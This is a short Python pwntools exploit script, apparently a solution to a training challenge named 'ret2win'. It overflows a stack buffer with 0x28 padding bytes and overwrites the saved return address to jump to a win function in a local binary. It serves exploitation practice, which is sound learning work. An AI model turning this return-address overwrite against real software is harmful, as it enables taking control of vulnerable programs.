from pwn import *
"""
Task:
    1. replace saved rip to ret2win
Checksec:
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

Gadget:
    ret2win: 0x0000000000400756
"""

def exploit():
    p = process("ret2win")
    e = ELF('ret2win')

    # proc.wait_for_debugger(p.pid)

    ret2win = e.symbols['ret2win']

    buf = b''
    buf += b"A"*0x28
    buf += p64(ret2win)


    p.sendline(buf)

    p.interactive()

exploit()